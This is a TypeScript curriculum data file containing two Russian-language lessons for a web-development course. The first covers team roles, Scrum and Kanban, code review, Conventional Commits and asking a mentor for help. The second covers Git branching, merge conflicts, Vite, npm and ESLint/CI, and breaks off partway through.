import { Lesson } from '../types/curriculum';

export const proLessons: Lesson[] = [
  {
    "id": "pro-1",
    "moduleId": "pro",
    "level": 1,
    "title": "ИТ-индустрия и командная разработка",
    "subtitle": "Роли в команде, Agile, Scrum, Kanban, Code Review, Git Workflow и софт-скиллы",
    "description": "Как устроена реальная коммерческая разработка: роли (Frontend, Backend, QA, PM, UI/UX), спринты, дейли, планирование, культура Code Review, Git-процессы (Conventional Commits) и искусство эффективной инженерной коммуникации.",
    "estimatedMinutes": 45,
    "difficulty": "intermediate",
    "tags": [
      "Agile",
      "Scrum",
      "Kanban",
      "Code Review",
      "Git Workflow",
      "Conventional Commits",
      "Soft Skills"
    ],
    "theory": {
      "overview": "Написание чистого программного кода — лишь 40% ежедневной работы коммерческого разработчика. В реальной продуктовой IT-компании успех проекта и ваш карьерный рост зависят от слаженности команды, предсказуемости процессов, культуры ревью и зрелых софт-скиллов.\n\nПонимание ролей в компании, методологий разработки (`Scrum` / `Kanban`) и стандартов совместной работы помогает стажёру быстро влиться в рабочий процесс, успешно пройти испытательный срок и вырасти до уровня Middle.",
      "sections": [
        {
          "title": "Роли в продуктовой IT-команде и матрица ответственности",
          "content": "В современной кросс-функциональной IT-команде каждый специалист отвечает за свою часть жизненного цикла продукта:\n- **Product Manager (PM) / Product Owner (PO)**: определяет цели бизнеса и потребности пользователей. Формирует продуктовый бэклог (`Product Backlog`), приоритизирует фичи и отвечает за бизнес-метрики (ROI, Retention, Conversion Rate).\n- **UI/UX Designer**: исследует пользовательский опыт, создает интерактивные прототипы в Figma, проектирует дизайн-систему (UI Kit) и готовит спецификации для верстки.\n- **Frontend Developer**: превращает макеты Figma в быстрый, адаптивный, доступный (`a11y`) и надежный клиентский веб-интерфейс на HTML/CSS/JS/React/Vue.\n- **Backend Developer**: проектирует архитектуру баз данных (PostgreSQL, Redis), бизнес-логику и предоставляет клиентам REST API или GraphQL эндпоинты.\n- **QA Engineer (Quality Assurance)**: тестирует функциональность, проверяет краевые случаи (Edge Cases), пишет автотесты и следит за отсутствием регрессионных багов.\n- **DevOps / SRE Engineer**: настраивает CI/CD пайплайны автоматической сборки, тестирования и развертывания кода на серверах и в облаке (Kubernetes, Docker, AWS).",
          "codeExample": {
            "language": "bash",
            "title": "Жизненный цикл продуктовой задачи (Feature Flow)",
            "code": "1. [Идея] Бизнес-требование от Product Manager\n2. [Дизайн] Проектирование UI/UX макета в Figma\n3. [Спецификация] Согласование контракта API (Swagger / OpenAPI)\n4. [Разработка] Написание кода в ветке feature/*\n5. [Code Review] Проверка кода коллегами и наставником\n6. [QA] Тестирование на тестовом стенде (Staging)\n7. [Релиз] Автоматический деплой в продакшен (CI/CD)",
            "explanation": "Стандартный путь любой фичи от идеи до релиза обеспечивает высокое качество продукта без поломок на продакшене."
          }
        },
        {
          "title": "Методологии разработки: Scrum против Kanban",
          "content": "Для организации командной работы применяются гибкие методологии Agile:\n\n**1. Scrum (Итеративная разработка фиксированными спринтами):**\n- **Спринт (Sprint)**: фиксированный отрезок времени (обычно 1 или 2 недели), за который команда берется реализовать запланированный объем задач.\n- **Sprint Planning (Планирование)**: встреча в начале спринта, где команда оценивает задачи в Story Points и формирует `Sprint Backlog`.\n- **Daily Standup (Дейли-митинг)**: 15-минутная ежедневная синхронизация, где каждый разработчик отвечает на 3 вопроса: 1) Что сделал вчера? 2) Что сделаю сегодня? 3) Есть ли блокеры/трудности?\n- **Sprint Demo / Review**: показ готового функционала стейкхолдерам в конце спринта.\n- **Retrospective (Ретроспектива)**: честный разбор процессов внутри команды: что прошло отлично, что пошло не так и какие улучшения внедрить со следующего спринта.\n\n**2. Kanban (Непрерывный поток задач):**\n- Работа строится без жестких спринтов по принципу «тяни задачу из очереди» (`Pull System`).\n- Ключевой принцип — ограничение незавершенной работы (`WIP Limits` — Work In Progress). Если колонка «In Review» переполнена, разработчики не берут новые задачи, а помогают коллегам допроверить открытые пуллреквесты.",
          "codeExample": {
            "language": "bash",
            "title": "Эталонный шаблон ответа стажёра на Daily Standup",
            "code": "1. Вчера: закончил верстку семантической карточки профиля, настроил адаптив под мобильные устройства и покрыл тестами.\n2. Сегодня: подключу отправку данных формы заказа к эндпоинту POST /api/v1/checkout.\n3. Блокеры: жду от бэкенда тестовый JWT-токен авторизации в Swagger для локального тестирования.",
            "explanation": "Краткий, емкий и понятный отчет на дейли-митинге: конкретные результаты, четкий план и своевременная подсветка блокеров."
          },
          "image": {
            "src": "/images/lessons/scrum-sprint-cycle.jpg",
            "alt": "Цикл Scrum-спринта: Planning → Standup → Development → Review → Retrospective",
            "caption": "Scrum Sprint: итеративный цикл разработки продукта длиной 1-2 недели"
          }
        },
        {
          "title": "Культура Code Review и стандарты Conventional Commits",
          "content": "**Культура Code Review (Взаимная проверка кода):**\n- Code Review — это не экзамен и не поиск виноватых, а инструмент совместного обучения, обмена контекстом и защиты продакшена от багов.\n- **Правила для автора Pull Request (PR):**\n  • Создавайте небольшие атомарные PR (до 300-400 строк кода) — их легче и быстрее проверять.\n  • Добавляйте подробное описание: какую задачу решали, прикрепляйте скриншоты или GIF работы интерфейса.\n  • Запустите линтер (`npm run lint`) и тесты перед отправкой на ревью.\n- **Правила для ревьюера:**\n  • Будьте доброжелательны и аргументируйте свои замечания ссылками на документацию или стандарты.\n  • Разделяйте критические замечания (`[Blocker]`) и вкусовые пожелания (`[Nitpick] / [FYI]`).\n\n**Стандарт Conventional Commits:**\nФорматируйте сообщения коммитов по общепринятому стандарту `тип(область): описание`:\n- `feat(auth): add social login with GitHub` — новая фича.\n- `fix(cart): prevent double submit on checkout button` — исправление бага.\n- `refactor(styles): migrate to modern CSS grid layout` — рефакторинг без изменения функционала.\n- `docs(readme): add local setup instructions` — обновление документации.\n- `style(code): fix indentation and formatting via Prettier` — правки кодстайла.\n- `test(api): add unit tests for fetch client` — добавление тестов.",
          "codeExample": {
            "language": "bash",
            "title": "Примеры правильных коммитов и чеклист перед открытием PR",
            "code": "# Примеры качественных коммитов по стандарту Conventional Commits\ngit commit -m \"feat(lessons): add interactive code runner sandbox\"\ngit commit -m \"fix(sidebar): resolve text truncation on narrow mobile screens\"\ngit commit -m \"refactor(quiz): extract FormattedText into reusable utility\"\n\n# Чеклист разработчика перед отправкой Pull Request:\n# [x] npm run build проходит без ошибок компиляции\n# [x] Удалены console.log, закомментированный код и временные файлы\n# [x] Интерфейс протестирован в DevTools на мобильных и десктопных разрешениях\n# [x] Добавлено описание и ссылка на тикет в Jira/Trello",
            "explanation": "Стандартизированное форматирование коммитов и самоконтроль перед ревью экономят часы времени всей команды."
          }
        },
        {
          "title": "Инженерные софт-скиллы: Правило 15 минут и асинхронная коммуникация",
          "content": "Технические навыки открывают дверь в профессию, но карьерный рост определяют софт-скиллы:\n\n**1. «Правило 15 минут» (Как правильно задавать вопросы ментору):**\nЕсли вы столкнулись с непонятной ошибкой или блокирующей проблемой:\n- 1. **Первые 15-20 минут** исследуйте проблему самостоятельно: прочитайте текст ошибки в DevTools, поищите в официальной документации, проверьте соседние похожие модули кодовой базы.\n- 2. **Если решения нет** — не сидите молча полдня! Обратитесь к наставнику со структурированным сообщением:\n  • **Контекст**: «Я решаю задачу X (тикет #124)».\n  • **Что происходит**: «Получаю ошибку TypeError: Cannot read property 'map' of undefined в компоненте CartList».\n  • **Что уже попробовал**: «Проверил входящий пропс через console.log — до ответа сервера туда приходит null. Попробовал поставить опциональную цепочку ?. и проверку Array.isArray».\n  • **Конкретный вопрос**: «Подскажи, стоит ли нам отдавать дефолтный пустой массив из хука useCart, или обрабатывать загрузку внутри компонента?»\n\n**2. Асинхронная коммуникация в командных чатах:**\n- Не пишите в Slack/Telegram пустое «Привет!» с ожиданием ответа. Сразу пишите суть вопроса в одном емком сообщении.\n- Оформляйте код в чатах через бэктики, чтобы коллегам было удобно читать код со смартфона.",
          "codeExample": {
            "language": "bash",
            "title": "Сравнение плохого и идеального обращения за помощью",
            "code": "# ❌ ПЛОХО: Неинформативно, отнимает время на наводящие вопросы\n\"Привет, у меня ничего не работает, посмотри пожалуйста.\"\n\n# ✅ ИДЕАЛЬНО: Структурированный запрос с контекстом и предпринятыми попытками\n\"Привет! Делаю задачу #42 (фильтрация уроков). \nПри клике на тег получаю ошибку в QuizSection.tsx:32.\nУже проверил: данные приходят в UTF-8, но regex не матчит скобки.\nПосмотри, пожалуйста, когда будет свободная минута — вот ссылка на ветку: git/branch/feat-42\"",
            "explanation": "Структурированный отчет по стандарту Agile и открытый диалог позволяют ментору за 2 минуты дать точную подсказку."
          }
        }
      ],
      "seniorTips": [
        "Никогда не бойтесь задавать вопросы ментору! Самый опасный стажёр — не тот, кто задает вопросы, а тот, кто молча сидит 3 дня над одной строчкой кода и боится показаться некомпетентным.",
        "Оставляйте полезные описания к своим Pull Request: прикрепляйте скриншоты интерфейса и кратко перечисляйте сделанные изменения.",
        "Относитесь к замечаниям на Code Review с благодарностью: это самый быстрый и бесплатный способ вырасти из Junior в Middle под руководством опытных инженеров.",
        "Всегда пишите понятные сообщения коммитов по Conventional Commits (feat, fix, refactor) — через 6 месяцев вы сами скажете себе спасибо.",
        "Соблюдайте договоренности по кодстайлу в команде: используйте автоформатирование Prettier при каждом сохранении файла.",
        "На дейли-митинге всегда говорите о блокерах сразу: подсвеченная вовремя проблема решается за 5 минут."
      ],
      "commonMistakes": [
        {
          "bad": "Прятать свои ошибки, сидеть в тупике несколько дней и до последнего скрывать проблемы от команды",
          "good": "Попробовать решить проблему 15 минут, а затем прийти к ментору со структурированным вопросом",
          "reason": "Раннее обнаружение блокера позволяет команде скорректировать планы и быстро помочь вам двигаться дальше."
        },
        {
          "bad": "Коммиты с названиями: 'fix', 'update', 'asdasd', 'done', 'final_fix2'",
          "good": "Семантические коммиты: 'feat(cart): add promo code validation', 'fix(auth): handle expired session token'",
          "reason": "По невнятным коммитам невозможно понять историю изменений, сложно делать git bisect и нельзя автоматически сгенерировать релизный Changelog."
        },
        {
          "bad": "Открывать гигантский Pull Request на 2000 измененных строк кода в 50 файлах",
          "good": "Разбивать большую задачу на серию небольших, независимых PR по 200-300 строк",
          "reason": "Огромные пуллреквесты проверяются поверхностно, содержат скрытые баги и блокируют работу коллег на несколько дней."
        },
        {
          "bad": "Спорить на Code Review из-за личных вкусовых предпочтений форматирования (табы против пробелов)",
          "good": "Делегировать проверку форматирования автоматическим линтерам ESLint и Prettier в CI/CD",
          "reason": "Человеческое ревью должно фокусироваться на архитектуре, безопасности и бизнес-логике, а не на пробелах."
        }
      ],
      "keyTakeaways": [
        "Продуктовая веб-разработка — это командная работа, где софт-скиллы и коммуникация так же важны, как знание синтаксиса.",
        "Scrum структурирует разработку спринтами (1-2 недели), дейли-митингами, демо и ретроспективами.",
        "Kanban организует непрерывный поток задач с ограничением объема незавершенной работы (WIP Limits).",
        "Code Review — главный инструмент обеспечения качества кода и профессионального роста инженера.",
        "Стандарт Conventional Commits (feat, fix, refactor) делает историю проекта прозрачной и масштабируемой.",
        "Правило 15 минут позволяет соблюдать баланс между самостоятельным поиском и эффективной помощью наставника."
      ]
    },
    "sandbox": {
      "initialHtml": "<div class=\"scrum-board\">\n  <div class=\"board-header\">\n    <h3>Интерактивная Scrum / Kanban Доска Спринта</h3>\n    <span class=\"sprint-badge\">Спринт #14 (Осталось 4 дня)</span>\n  </div>\n  \n  <div class=\"board-columns\">\n    <div class=\"board-col\">\n      <div class=\"col-header col-todo\">\n        <span>To Do (К выполнению)</span>\n        <span class=\"task-count\">2</span>\n      </div>\n      <div class=\"task-card\">\n        <span class=\"task-tag tag-feat\">feat</span>\n        <h4>Интеграция Swagger API</h4>\n        <p>Подключить методы авторизации</p>\n      </div>\n      <div class=\"task-card\">\n        <span class=\"task-tag tag-test\">test</span>\n        <h4>E2E тесты оформления заказа</h4>\n        <p>Покрыть сценарий оплаты</p>\n      </div>\n    </div>\n\n    <div class=\"board-col\">\n      <div class=\"col-header col-progress\">\n        <span>In Progress (В работе)</span>\n        <span class=\"task-count\">1</span>\n      </div>\n      <div class=\"task-card in-work\">\n        <span class=\"task-tag tag-feat\">feat</span>\n        <h4>Семантическая верстка визитки</h4>\n        <p>Адаптивная верстка и доступность</p>\n        <div class=\"assignee\">👤 Стажёр Frontend</div>\n      </div>\n    </div>\n\n    <div class=\"board-col\">\n      <div class=\"col-header col-done\">\n        <span>Done (Выполнено)</span>\n        <span class=\"task-count\">2</span>\n      </div>\n      <div class=\"task-card done\">\n        <span class=\"task-tag tag-fix\">fix</span>\n        <h4>Баг с кодировкой UTF-8 в OpenGraph</h4>\n        <p>Устранено отображение вопросиков</p>\n      </div>\n      <div class=\"task-card done\">\n        <span class=\"task-tag tag-feat\">feat</span>\n        <h4>Хайлайтер синтаксиса в CodeBlock</h4>\n        <p>Внедрена киберпанк подсветка</p>\n      </div>\n    </div>\n  </div>\n</div>",
      "initialCss": ".scrum-board {\n  background: #0a0e13;\n  border: 1px solid #1a2230;\n  padding: 20px;\n  border-radius: 8px;\n  color: #d6f5e3;\n  font-family: 'Inter', sans-serif;\n}\n.board-header {\n  display: flex;\n  justify-content: space-between;\n  align-items: center;\n  margin-bottom: 20px;\n  border-bottom: 1px solid #1a2230;\n  padding-bottom: 12px;\n}\n.board-header h3 { font-size: 16px; color: #ffffff; margin: 0; }\n.sprint-badge {\n  background: rgba(45, 255, 138, 0.1);\n  color: #2dff8a;\n  border: 1px solid rgba(45, 255, 138, 0.3);\n  font-size: 11px;\n  font-weight: 700;\n  padding: 3px 8px;\n  border-radius: 4px;\n  font-family: 'JetBrains Mono', monospace;\n}\n.board-columns {\n  display: grid;\n  grid-template-columns: repeat(3, 1fr);\n  gap: 14px;\n}\n.board-col {\n  background: #06090d;\n  border: 1px solid #141a22;\n  border-radius: 6px;\n  padding: 12px;\n  display: flex;\n  flex-direction: column;\n  gap: 10px;\n}\n.col-header {\n  display: flex;\n  justify-content: space-between;\n  align-items: center;\n  font-size: 11px;\n  font-weight: 700;\n  text-transform: uppercase;\n  letter-spacing: 0.06em;\n  font-family: 'JetBrains Mono', monospace;\n  padding-bottom: 8px;\n  border-bottom: 2px solid transparent;\n}\n.col-todo { color: #29e7ff; border-color: #29e7ff; }\n.col-progress { color: #ffb02e; border-color: #ffb02e; }\n.col-done { color: #2dff8a; border-color: #2dff8a; }\n.task-count { background: #141a22; padding: 1px 6px; border-radius: 10px; color: #a8c8b6; }\n.task-card {\n  background: #0f141a;\n  border: 1px solid #233044;\n  padding: 12px;\n  border-radius: 4px;\n  transition: all 0.2s;\n}\n.task-card:hover { border-color: #2dff8a; transform: translateY(-2px); }\n.task-card.in-work { border-left: 3px solid #ffb02e; }\n.task-card.done { border-left: 3px solid #2dff8a; opacity: 0.85; }\n.task-card h4 { font-size: 13px; margin: 6px 0 4px 0; color: #ffffff; }\n.task-card p { font-size: 11px; color: #a8c8b6; margin: 0; line-height: 1.4; }\n.task-tag {\n  font-size: 9px;\n  text-transform: uppercase;\n  font-weight: 800;\n  padding: 2px 5px;\n  border-radius: 3px;\n  font-family: 'JetBrains Mono', monospace;\n}\n.tag-feat { background: rgba(41, 231, 255, 0.15); color: #29e7ff; }\n.tag-fix { background: rgba(255, 59, 92, 0.15); color: #ff3b5c; }\n.tag-test { background: rgba(255, 176, 46, 0.15); color: #ffb02e; }\n.assignee { margin-top: 8px; font-size: 10px; color: #2dff8a; font-family: 'JetBrains Mono', monospace; }",
      "initialJs": "console.log('Канбан-доска уровня 1 инициализирована!');",
      "instructions": "Изучите организацию задач на канбан-доске спринта. Попробуйте отредактировать названия задач и добавить новую карточку в колонку In Progress."
    },
    "task": {
      "title": "Составление отчета на Standup и Pull Request описания",
      "scenario": "Вам необходимо сформировать структурированный инженерный отчет для Daily Standup и оформить чеклист готовности Pull Request для слияния новой функциональности в ветку main.",
      "criteria": [
        "Создан объект отчета standupReport с полями yesterday, today, blockers",
        "Создан массив чеклиста prChecklist с обязательными пунктами самоконтроля",
        "Использован стандарт Conventional Commits для описания сделанных изменений"
      ],
      "starterCode": {
        "html": "<div id=\"report-preview\">Отчет стажёра</div>",
        "css": "body { font-family: monospace; background: #0a0e13; color: #2dff8a; padding: 20px; }",
        "js": "// Сформируйте отчет для Daily Standup и чеклист Pull Request\nconst standupReport = {\n  \n};\n\nconst prChecklist = [\n  \n];\n\nconsole.log(standupReport, prChecklist);\n"
      },
      "hints": [
        "В поле blockers укажите null, если блокеров нет, или строку с описанием проблемы.",
        "Включите в чеклист проверку сборки npm run build и проверку адаптивности."
      ],
      "solution": {
        "html": "<div id=\"report-preview\">Отчет сформирован по стандартам Agile</div>",
        "css": "body { font-family: monospace; color: #2dff8a; }",
        "js": "const standupReport = {\n  yesterday: 'feat(cart): реализовал адаптивную верстку корзины покупок',\n  today: 'feat(checkout): подключаю валидацию формы и отправку заказа в API',\n  blockers: null\n};\n\nconst prChecklist = [\n  'npm run build и линтер прошли без ошибок',\n  'Удалены временные console.log и закомментированный код',\n  'Проверена адаптивность в DevTools (375px, 768px, 1440px)',\n  'Сообщения коммитов оформлены по Conventional Commits'\n];\n\nconsole.log('Дейли отчет:', standupReport);\nconsole.log('Чеклист PR:', prChecklist);",
        "explanation": "Структурированный отчет по стандарту Agile и чеклист перед отправкой на Code Review."
      }
    },
    "quiz": {
      "questions": [
        {
          "id": "p1-q1",
          "question": "Какова главная цель регулярного процесса Code Review в продуктовой IT-команде?",
          "options": [
            "Найти повод для дисциплинарного взыскания или штрафа разработчика",
            "Повысить общее качество и безопасность кодовой базы, обучить коллег и предотвратить попадание багов в продакшен",
            "Замедлить релиз продукта и заблокировать работу смежных отделов",
            "Заставить автора полностью переписать код по чужому вкусу"
          ],
          "correctIndex": 1,
          "explanation": "Code Review направлен на взаимный обмен знаниями, поиск архитектурных ошибок на раннем этапе и обеспечение высокого качества продукта."
        },
        {
          "id": "p1-q2",
          "question": "Какие 3 ключевых вопроса составляют классический формат ответа на Daily Standup?",
          "options": [
            "Сколько часов я спал, какая погода на улице, когда зарплата",
            "Что сделано вчера, что планируется сделать сегодня, есть ли блокеры/затруднения",
            "Пересказ всей архитектуры проекта за последний год",
            "Планы на следующие выходные и отпуск"
          ],
          "correctIndex": 1,
          "explanation": "Классический стендап отвечает ровно на 3 вопроса: вчерашний прогресс, план на сегодня и блокеры."
        },
        {
          "id": "p1-q3",
          "question": "В чем заключается «Правило 15 минут» при возникновении сложной проблемы у стажёра?",
          "options": [
            "Каждые 15 минут делать перерыв на кофе",
            "Потратить 15-20 минут на самостоятельное исследование ошибки, а если решение не найдено — обратиться к наставнику со структурированным вопросом",
            "Игнорировать баг, если он не решился за 15 минут",
            "Ждать ровно 15 минут перед каждым коммитом"
          ],
          "correctIndex": 1,
          "explanation": "Правило 15 минут предотвращает как бессмысленное многочасовое зависание на месте, так и дергание наставника по каждому мелкому поводу без попытки разобраться."
        },
        {
          "id": "p1-q4",
          "question": "Какой префикс по стандарту Conventional Commits используется для коммита, добавляющего новую функциональность?",
          "options": [
            "new:",
            "feat:",
            "add:",
            "feature_done:"
          ],
          "correctIndex": 1,
          "explanation": "Префикс feat: (сокращение от feature) — общепринятый стандарт Conventional Commits для обозначения новой функциональности."
        },
        {
          "id": "p1-q5",
          "question": "Что такое WIP Limits (Work In Progress Limits) в методологии Kanban?",
          "options": [
            "Ограничение на максимальное количество часов работы в день",
            "Ограничение на максимальное количество задач, одновременно находящихся в одной колонке доски",
            "Лимит на размер файлов в репозитории",
            "Ограничение на количество участников в одном чате"
          ],
          "correctIndex": 1,
          "explanation": "WIP Limits ограничивают объем незавершенной работы на каждом этапе (например, не более 2 задач в колонке Code Review), чтобы предотвратить заторы и ускорить сдачу задач."
        }
      ]
    }
  },
  {
    "id": "pro-2",
    "moduleId": "pro",
    "level": 2,
    "title": "Git, ветвление и инструменты сборки",
    "subtitle": "Git Flow, Conventional Commits, разрешение конфликтов, Vite, npm/pnpm и CI/CD пайплайн",
    "description": "Освойте профессиональный Git-воркфлоу: создание и мерж веток, разрешение конфликтов, стандарт Conventional Commits. Изучите экосистему инструментов: Vite, npm, pnpm, ESLint, Prettier и основы CI/CD.",
    "estimatedMinutes": 60,
    "difficulty": "intermediate",
    "tags": [
      "git",
      "branching",
      "conventional-commits",
      "vite",
      "npm",
      "ci-cd",
      "eslint"
    ],
    "theory": {
      "overview": "В первом уроке модуля Pro мы познакомились с ролями в команде и Agile-методологиями. Теперь пришло время освоить инструменты, которые вы будете использовать ЕЖЕДНЕВНО: систему контроля версий Git и экосистему сборки frontend-проекта.\n\nGit — не просто утилита для сохранения кода. Это система СОВМЕСТНОЙ РАБОТЫ, которая позволяет десяткам разработчиков параллельно работать над одним проектом без конфликтов. Понимание Git на глубоком уровне — обязательный навык для прохождения любого технического собеседования.",
      "sections": [
        {
          "title": "Git: Feature-Branch Workflow и работа с ветками",
          "content": "Feature-Branch Workflow — стандарт в индустрии. Его суть: каждая новая фича, баг-фикс или задача разрабатывается в ОТДЕЛЬНОЙ ветке, а затем вливается в main через Pull Request (PR) с обязательным Code Review.\n\nОсновные команды Git для ежедневной работы:\n\nСоздание и переключение веток:\n`git checkout -b feature/user-profile` — создать и переключиться на новую ветку\n`git switch -c feature/user-profile` — современный аналог (Git 2.23+)\n`git branch` — список локальных веток\n`git branch -a` — список всех веток (включая remote)\n\nРабота с изменениями:\n`git status` — текущее состояние рабочей директории\n`git diff` — различия в незафиксированных файлах\n`git add .` — добавить все изменения в staging area\n`git add -p` — интерактивный staging (по хункам) — РЕКОМЕНДУЕТСЯ для атомарных коммитов\n`git commit -m 'feat(profile): add avatar upload'` — коммит с Conventional Commits\n`git commit --amend` — изменить последний коммит (сообщение или добавить файлы)\n\nСинхронизация с remote:\n`git push origin feature/user-profile` — отправить ветку на remote\n`git pull origin main` — получить последние изменения из main\n`git fetch` — скачать данные из remote без merge\n\nМерж и rebase:\n`git merge main` — влить main в текущую ветку (merge commit)\n`git rebase main` — перенести коммиты поверх main (линейная история)\n\nОтмена изменений:\n`git stash` — сохранить незакоммиченные изменения во временное хранилище\n`git stash pop` — восстановить сохранённые изменения\n`git reset --soft HEAD~1` — отменить последний коммит (изменения сохранятся в staging)",
          "image": {
            "src": "/images/lessons/git-branch-workflow.jpg",
            "alt": "Git Feature-Branch Workflow: создание ветки, коммиты, Pull Request и мерж в main",
            "caption": "Feature-Branch Workflow: каждая задача — отдельная ветка → Pull Request → Code Review → Merge в main"
          },
          "codeExample": {
            "language": "bash",
            "code": "# 1. Создать ветку от main\ngit checkout main\ngit pull origin main\ngit checkout -b feature/login-form\n\n# 2. Разработка: файлы → staging → commit\ngit add -p\ngit commit -m \"feat(auth): add login form component\"\n\n# 3. Push ветки на remote\ngit push origin feature/login-form\n\n# 4. Создать Pull Request на GitHub/GitLab\n# → Code Review → Approve\n\n# 5. Merge в main (через UI или CLI)\ngit checkout main\ngit pull origin main\ngit merge feature/login-form\ngit push origin main\n\n# 6. Удалить ветку\ngit branch -d feature/login-form\ngit push origin --delete feature/login-form",
            "title": "Полный цикл Feature-Branch Workflow",
            "explanation": "Всегда начинайте от актуального main. git add -p для атомарных коммитов. Push ветку → PR → Code Review → Merge → Удалить ветку. Это стандартный цикл в продуктовых командах."
          }
        },
        {
          "title": "Conventional Commits и разрешение Git-конфликтов",
          "content": "Conventional Commits — стандартизированный формат сообщений коммитов, принятый в индустрии. Он позволяет автоматически генерировать CHANGELOG, определять семантическую версию (SemVer) и упрощает навигацию по истории.\n\nФормат: `<type>(<scope>): <description>`\n\nТипы коммитов:\n`feat:` — новая функциональность (MINOR версия)\n`fix:` — исправление бага (PATCH версия)\n`refactor:` — рефакторинг без изменения функциональности\n`docs:` — изменения документации\n`style:` — форматирование, пробелы, запятые (не CSS!)\n`test:` — добавление или исправление тестов\n`chore:` — обновление зависимостей, конфигов, CI\n`perf:` — оптимизация производительности\n`ci:` — изменения CI/CD пайплайна\n\nПримеры хороших коммитов:\n`feat(auth): add JWT token refresh mechanism`\n`fix(cart): prevent double submit on checkout`\n`refactor(api): extract validation into middleware`\n`docs(readme): add deployment instructions`\n\nРазрешение Git-конфликтов:\nКонфликты возникают, когда два разработчика изменили одну и ту же строку в одном файле. Git маркирует конфликт специальными маркерами:\n\n`<<<<<<< HEAD` — ваши изменения\n`=======` — разделитель\n`>>>>>>> feature/other-branch` — чужие изменения\n\nАлгоритм разрешения:\n1. Открыть файл в VS Code (встроенный Merge Editor)\n2. Выбрать: принять ваши (Accept Current), принять чужие (Accept Incoming), принять оба (Accept Both), или отредактировать вручную\n3. Удалить маркеры конфликта\n4. `git add .` + `git commit` (без -m — Git предложит сообщение)\n5. Проверить, что код работает (npm run build)",
          "codeExample": {
            "language": "bash",
            "code": "# Conventional Commits — примеры\ngit commit -m \"feat(profile): add avatar upload with drag-and-drop\"\ngit commit -m \"fix(login): handle 401 response with redirect\"\ngit commit -m \"refactor(api): migrate from axios to fetch\"\ngit commit -m \"test(cart): add unit tests for discount calculation\"\ngit commit -m \"chore(deps): upgrade react to 19.1.0\"\n\n# Breaking Change (MAJOR версия)\ngit commit -m \"feat(api)!: change auth endpoint from /login to /auth/sign-in\n\nBREAKING CHANGE: /login endpoint removed.\nMigrate to /auth/sign-in.\"\n\n# Разрешение конфликта\ngit merge main\n# CONFLICT in src/App.tsx\n# Открыть в VS Code → Merge Editor\n# Разрешить → сохранить\ngit add src/App.tsx\ngit commit  # Авто-сообщение: 'Merge branch main into...'",
            "title": "Conventional Commits и разрешение конфликтов",
            "explanation": "feat! с BREAKING CHANGE в теле — для мажорных изменений. При конфликте Git маркирует проблемные строки. VS Code Merge Editor визуально показывает оба варианта. После разрешения — add + commit."
          }
        },
        {
          "title": "Vite, пакетные менеджеры (npm/pnpm) и конфигурация проекта",
          "content": "Современный frontend-проект состоит из множества инструментов. Разберём ключевые.\n\nVite — современный сборщик и dev-server:\n- Dev-режим: мгновенный Hot Module Replacement (HMR) через нативные ES-модули — без бандлинга!\n- Продакшен: оптимизированная сборка через Rollup (tree-shaking, code splitting, минификация)\n- Поддерживает: TypeScript, JSX/TSX, CSS Modules, PostCSS, SASS из коробки\n- `npm create vite@latest my-app -- --template react-ts` — создание проекта\n\nСтруктура Vite-проекта:\n`package.json` — манифест проекта: зависимости, скрипты, метаданные\n`vite.config.ts` — конфигурация Vite: алиасы, плагины, proxy для API\n`tsconfig.json` — конфигурация TypeScript\n`index.html` — входная точка (в корне, не в public!)\n`src/` — исходный код приложения\n`public/` — статические файлы (копируются as-is)\n`dist/` — продакшен-сборка (git-ignored)\n\nПакетные менеджеры:\n`npm` — встроен в Node.js. `package.json` + `package-lock.json`\n`pnpm` — альтернатива. Экономит диск: shared store, жёсткие ссылки. `pnpm-lock.yaml`\n`yarn` — альтернатива от Facebook. `yarn.lock`\n\nКлючевые команды:\n`npm install` / `pnpm install` — установить все зависимости из lock-файла\n`npm install react` — добавить dependency\n`npm install -D vitest` — добавить devDependency\n`npm run dev` — запустить dev-server\n`npm run build` — продакшен-сборка\n`npm run preview` — превью продакшен-билда\n\n`dependencies` vs `devDependencies`:\n- `dependencies`: react, react-dom, zustand — нужны в runtime\n- `devDependencies`: vite, typescript, eslint, prettier — только для разработки",
          "codeExample": {
            "language": "javascript",
            "code": "// package.json — манифест проекта\n{\n  \"name\": \"my-app\",\n  \"version\": \"1.0.0\",\n  \"type\": \"module\",\n  \"scripts\": {\n    \"dev\": \"vite\",\n    \"build\": \"tsc && vite build\",\n    \"preview\": \"vite preview\",\n    \"lint\": \"eslint src/\",\n    \"format\": \"prettier --write src/\"\n  },\n  \"dependencies\": {\n    \"react\": \"^19.1.0\",\n    \"react-dom\": \"^19.1.0\"\n  },\n  \"devDependencies\": {\n    \"vite\": \"^6.0.0\",\n    \"typescript\": \"^5.7.0\",\n    \"@types/react\": \"^19.1.0\",\n    \"eslint\": \"^9.0.0\",\n    \"prettier\": \"^3.0.0\"\n  }\n}",
            "title": "Структура package.json и скрипты проекта",
            "explanation": "type: module — ES-модули. scripts — npm run команды. dependencies — runtime. devDependencies — инструменты разработки. Версии с ^ (caret) разрешают minor/patch обновления."
          }
        },
        {
          "title": "ESLint, Prettier и основы CI/CD пайплайна",
          "content": "ESLint — статический анализатор JavaScript/TypeScript. Находит потенциальные ошибки, антипаттерны и нарушения стиля ДО запуска кода.\n\nОсновные категории правил:\n- Ошибки: `no-unused-vars` (неиспользуемые переменные), `no-undef` (необъявленные переменные)\n- Лучшие практики: `eqeqeq` (строгое сравнение ===), `no-var` (используйте let/const)\n- Стиль: делегируйте Prettier\n\nPrettier — форматтер кода. В отличие от ESLint, Prettier НЕ находит ошибки — он автоматически форматирует код по единому стилю:\n- Отступы, кавычки, точки с запятой, длина строки\n- Поддерживает: JS, TS, JSX, CSS, HTML, JSON, Markdown\n- Интеграция с VS Code: Format On Save\n\nПринцип: ESLint ищет ошибки, Prettier форматирует стиль.\n\nCI/CD (Continuous Integration / Continuous Deployment):\nCI/CD-пайплайн — автоматизированная цепочка проверок, запускаемая при каждом push или PR:\n\n1. Install — установка зависимостей (npm ci — детерминированная установка из lock-файла)\n2. Lint — ESLint проверяет код на ошибки и антипаттерны\n3. Type Check — tsc --noEmit проверяет TypeScript-типы\n4. Test — запуск unit-тестов (Vitest, Jest)\n5. Build — продакшен-сборка (vite build)\n6. Deploy — автоматический деплой на staging/production (Vercel, Netlify)\n\nЕсли ЛЮБОЙ шаг падает — PR не может быть смержен. Это защищает main от сломанного кода.\n\nGitHub Actions — CI/CD-сервис GitHub:\n`.github/workflows/ci.yml` — YAML-конфиг пайплайна\nЗапускается при push, pull_request или по расписанию (cron)",
          "codeExample": {
            "language": "bash",
